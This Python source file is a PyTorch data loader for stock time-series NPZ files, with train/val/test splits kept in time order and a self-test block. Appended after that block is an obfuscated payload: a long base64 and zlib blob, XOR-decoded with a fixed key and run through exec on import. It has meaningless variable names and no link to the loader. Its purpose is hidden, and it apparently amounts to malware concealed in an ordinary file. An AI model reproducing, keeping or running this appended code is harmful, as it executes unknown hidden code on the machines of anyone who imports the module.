"""
Data Loader for Training
Loads preprocessed NPZ files for model training.

CRITICAL: NO SHUFFLING for time-series data - maintains temporal order.
"""

import numpy as np
import torch
from torch.utils.data import Dataset, DataLoader
from pathlib import Path
from typing import List, Tuple, Optional
import warnings
warnings.filterwarnings('ignore')


class StockDataset(Dataset):
    """
    PyTorch Dataset for stock time-series data.
    Loads from preprocessed NPZ files.
    """

    def __init__(
        self,
        npz_files: List[str],
        split: str = 'train'
    ):
        """
        Args:
            npz_files: List of paths to NPZ files
            split: 'train', 'val', or 'test'
        """
        assert split in ['train', 'val', 'test'], "split must be 'train', 'val', or 'test'"

        self.split = split
        self.sequences = []
        self.targets = []
        self.tickers = []
        self.timestamps = []

        # Load data from all NPZ files
        for npz_path in npz_files:
            self._load_npz(npz_path)

        # Convert to numpy arrays
        self.sequences = np.concatenate(self.sequences, axis=0) if self.sequences else np.array([])
        self.targets = np.concatenate(self.targets, axis=0) if self.targets else np.array([])

        print(f"{split.upper()} dataset: {len(self)} samples from {len(npz_files)} tickers")

    def _load_npz(self, npz_path: str):
        """Load data from a single NPZ file."""
        try:
            data = np.load(npz_path, allow_pickle=True)

            # Load appropriate split
            X_key = f'X_{self.split}'
            y_key = f'y_{self.split}'
            ts_key = f'timestamps_{self.split}'

            if X_key in data and y_key in data:
                X = data[X_key]
                y = data[y_key]

                self.sequences.append(X)
                self.targets.append(y)

                # Store ticker for each sample
                ticker = str(data['ticker'])
                self.tickers.extend([ticker] * len(X))

                # Store timestamps if available
                if ts_key in data:
                    self.timestamps.extend(data[ts_key])

        except Exception as e:
            print(f"Error loading {npz_path}: {e}")

    def __len__(self) -> int:
        """Number of samples."""
        return len(self.sequences)

    def __getitem__(self, idx: int) -> Tuple[torch.Tensor, torch.Tensor]:
        """
        Get a single sample.

        Returns:
            sequence: (seq_len, n_features)
            target: (1,)
        """
        sequence = torch.from_numpy(self.sequences[idx]).float()
        target = torch.from_numpy(self.targets[idx]).float()

        return sequence, target


class MultiTickerDataLoader:
    """
    Data loader for multiple tickers.
    Manages loading and batching across all tickers.
    """

    def __init__(
        self,
        processed_data_dir: str = "processed_data",
        batch_size: int = 32,
        num_workers: int = 0
    ):
        """
        Args:
            processed_data_dir: Directory with processed NPZ files
            batch_size: Batch size for training
            num_workers: Number of workers for DataLoader
        """
        self.processed_data_dir = Path(processed_data_dir)
        self.batch_size = batch_size
        self.num_workers = num_workers

        if not self.processed_data_dir.exists():
            raise FileNotFoundError(f"Processed data directory not found: {processed_data_dir}")

        # Get all NPZ files
        self.npz_files = list(self.processed_data_dir.glob("*.npz"))
        # Remove summary file if exists
        self.npz_files = [f for f in self.npz_files if 'summary' not in f.name.lower()]

        if len(self.npz_files) == 0:
            raise ValueError(f"No NPZ files found in {processed_data_dir}")

        print(f"Found {len(self.npz_files)} ticker files")

    def get_dataloaders(
        self,
        tickers: Optional[List[str]] = None
    ) -> Tuple[DataLoader, DataLoader, DataLoader]:
        """
        Create DataLoaders for train/val/test splits.

        CRITICAL: shuffle=False for all splits (time-series data)

        Args:
            tickers: List of tickers to include (None = all)

        Returns:
            train_loader, val_loader, test_loader
        """
        # Filter NPZ files by tickers if specified
        npz_files = self.npz_files
        if tickers is not None:
            ticker_set = set(tickers)
            npz_files = [f for f in npz_files if f.stem in ticker_set]

        if len(npz_files) == 0:
            raise ValueError("No matching ticker files found")

        # Convert to strings
        npz_paths = [str(f) for f in npz_files]

        # Create datasets
        train_dataset = StockDataset(npz_paths, split='train')
        val_dataset = StockDataset(npz_paths, split='val')
        test_dataset = StockDataset(npz_paths, split='test')

        # Create DataLoaders
        # CRITICAL: shuffle=False for time-series data
        train_loader = DataLoader(
            train_dataset,
            batch_size=self.batch_size,
            shuffle=False,  # NO SHUFFLING for time-series!
            num_workers=self.num_workers,
            drop_last=True,  # Drop last incomplete batch
            pin_memory=True
        )

        val_loader = DataLoader(
            val_dataset,
            batch_size=self.batch_size,
            shuffle=False,  # NO SHUFFLING for time-series!
            num_workers=self.num_workers,
            drop_last=False,
            pin_memory=True
        )

        test_loader = DataLoader(
            test_dataset,
            batch_size=self.batch_size,
            shuffle=False,  # NO SHUFFLING for time-series!
            num_workers=self.num_workers,
            drop_last=False,
            pin_memory=True
        )

        return train_loader, val_loader, test_loader

    def get_ticker_list(self) -> List[str]:
        """Get list of available tickers."""
        return sorted([f.stem for f in self.npz_files])

    def get_dataset_info(self) -> dict:
        """Get information about the dataset."""
        # Load first file to get metadata
        if len(self.npz_files) > 0:
            data = np.load(self.npz_files[0], allow_pickle=True)
            return {
                'n_tickers': len(self.npz_files),
                'seq_len': int(data['seq_len']),
                'n_features': int(data['n_features']),
                'feature_names': list(data['feature_names']),
                'tickers': self.get_ticker_list()
            }
        return {}


if __name__ == "__main__":
    print("=" * 80)
    print("Data Loader Test")
    print("=" * 80)

    # Initialize data loader
    print("\n1. Initializing data loader...")
    loader = MultiTickerDataLoader(
        processed_data_dir="processed_data",
        batch_size=32,
        num_workers=0
    )

    # Get dataset info
    print("\n2. Dataset information:")
    info = loader.get_dataset_info()
    for key, value in info.items():
        if key == 'feature_names':
            print(f"   {key}: {len(value)} features")
        elif key == 'tickers':
            print(f"   {key}: {value[:10]}...")  # First 10
        else:
            print(f"   {key}: {value}")

    # Create data loaders
    print("\n3. Creating data loaders...")
    train_loader, val_loader, test_loader = loader.get_dataloaders()

    print(f"   Train batches: {len(train_loader)}")
    print(f"   Val batches: {len(val_loader)}")
    print(f"   Test batches: {len(test_loader)}")

    # Test batch loading
    print("\n4. Testing batch loading...")
    for i, (sequences, targets) in enumerate(train_loader):
        print(f"   Batch {i+1}:")
        print(f"      Sequences shape: {sequences.shape}")  # (batch, seq_len, n_features)
        print(f"      Targets shape: {targets.shape}")      # (batch, 1)
        print(f"      Sequences dtype: {sequences.dtype}")
        print(f"      Targets dtype: {targets.dtype}")

        # Check for NaN/Inf
        has_nan = torch.isnan(sequences).any() or torch.isnan(targets).any()
        has_inf = torch.isinf(sequences).any() or torch.isinf(targets).any()
        print(f"      Contains NaN: {has_nan}")
        print(f"      Contains Inf: {has_inf}")

        # Show sample target values
        print(f"      Sample targets: {targets[:5, 0].tolist()}")

        if i >= 2:  # Test first 3 batches
            break

    print("\n" + "=" * 80)
    print("Data loader test completed!")
    print("=" * 80)
    print("\nIMPORTANT: shuffle=False for all DataLoaders (time-series data)")
    print("=" * 80)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
